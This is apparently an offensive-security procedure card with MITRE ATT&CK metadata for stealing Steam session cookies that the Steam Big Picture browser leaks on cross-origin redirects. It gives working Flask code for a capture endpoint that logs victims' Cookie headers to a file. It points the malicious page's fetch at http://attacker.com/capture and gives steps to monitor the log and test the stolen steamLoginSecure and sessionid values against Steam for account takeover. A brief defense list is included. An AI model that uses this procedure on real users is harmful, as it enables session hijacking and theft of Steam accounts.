---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
name: Capture-Leaked-Cookies-via-Redirect
tags:
  - cookie-leak
  - credential-access
  - steam
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
  - Desktop Application (Steam Big Picture)
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:33:24.514Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Capture-Leaked-Cookies-via-Redirect

## Summary

This procedure captures secure login cookies leaked by the Steam Big Picture browser during cross-origin forwarded requests, allowing the attacker to steal session data for account takeover.

## Description

Once the malicious page is loaded, the browser sends a request to the attacker's server with Steam's secure cookies (e.g., steamLoginSecure) attached, violating expected same-origin policy. The attacker logs these cookies from the request headers. With the stolen cookies, the attacker can impersonate the victim on Steam services, potentially changing passwords or accessing linked accounts. This relies on the victim being authenticated in Big Picture mode.

## Requirements

1. Running capture server endpoint from previous procedure
2. Victim interaction with the malicious page
3. Tools to inspect HTTP requests (e.g., server logs or Wireshark)

## Defense

Defensive measures and detection strategies:

- Enforce SameSite=Lax or Strict on cookies to block cross-site requests
- Browser updates to fix cross-origin cookie handling
- Anomaly detection on Steam servers for unusual cross-origin traffic

## Objectives

1. Receive the forwarded request with leaked cookies
2. Extract and store sensitive cookie values
3. Use cookies for session hijacking

## Instructions

### Step 1: Set Up Capture Endpoint

**Context**: Create a server route to log incoming requests and their headers.

Use a simple Node.js or Python server. For Python with Flask:

```python
import flask
app = flask.Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture():
    cookies = flask.request.headers.get('Cookie')
    print(f"Leaked Cookies: {cookies}")
    with open('leaked_cookies.txt', 'a') as f:
        f.write(f"{cookies}\n")
    return 'OK'

app.run(host='0.0.0.0', port=80)
```

> Install Flask if needed (`pip install flask`). Run the server and point the malicious page's fetch to http://attacker.com/capture.

### Step 2: Monitor and Extract Cookies

**Context**: When the victim loads the page, check logs for the request.

Tail the log file or console output:

```bash
tail -f leaked_cookies.txt
```

> Look for cookies like `steamLoginSecure=...; sessionid=...`. Validate by testing them in a browser against Steam.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used

- [[tail-monitor-logs]]

## Tools Used


## Tags

- [[cookie-leak]]
- [[credential-access]]
- [[steam]]
